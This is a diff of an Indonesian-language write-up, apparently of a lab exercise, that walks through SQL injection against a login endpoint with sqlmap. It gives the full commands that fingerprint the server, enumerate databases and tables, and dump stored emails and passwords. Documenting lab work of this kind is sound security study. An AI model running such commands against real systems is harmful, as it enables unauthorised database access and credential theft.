@@ -372,17 +372,17 @@ Setelah mengeksekusi _payload_, SQLMap sukses membuktikan bahwa parameter `test`
 ![Konfirmasi Celah SQLi](../../Assets/Images/SQLI.png)
 
 **2. Fingerprinting OS Target**
-Identitas mesin target berhasil dikuak (Linux Ubuntu, Web Nginx, dan DBMS MySQL):
+SQLI secara otomatis menginformasikan Identitas mesin target **(Windows, Web Apache 2.4.53 , dan DBMS MySQL):**
 ![Fingerprinting OS Target](../../Assets/Images/OutputInject.png)
 
 **3. Enumeration Database (Dumping Database Names)**
-Menggunakan _flag_ `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' --dbs` sukses mengeluarkan semua nama database yang tersedia di dalam _server_ target (`ai, information_schema, mysql, performance_schema, phpmyadmin, test`):
+Menggunakan _flag_ `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' --dbs` berhasil mengeluarkan semua nama database yang tersedia di dalam _server_ target (`ai, information_schema, mysql, performance_schema, phpmyadmin, test`):
 ![Daftar Nama Database](../../Assets/Images/dbsoutput.png)
 
 **4. Enumeration Table (Dumping Table Names)**
-Membongkar brankas _database_ bernama `ai` menggunakan flag `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' -D ai --tables` sukses memunculkan tabel bernama `user`:
+Inject _database_ bernama `ai` menggunakan flag `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' -D ai --tables` dan memunculkan tabel bernama `user`:
 ![Tabel di Dalam Database Users](../../Assets/Images/insidedbs.png)
 
 **5. The Final Dump**
-Menyasar spesifik tabel `ai` menggunakan _flag_ `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' -D ai --dump`, akhirnya data _Email_ dan _Password_ secara mentah keluar dari _database_:
+Melihat seluruh isi _database_ `ai` menggunakan _flag_ `sqlmap -u 'http://10.48.136.243/ai/includes/user_login?email=test&password=test' -D ai --dump`, akhirnya data _Email_ dan _Password_ secara mentah keluar dari _database_:
 ![Hasil Dump Username dan Password](../../Assets/Images/dumptable.png)
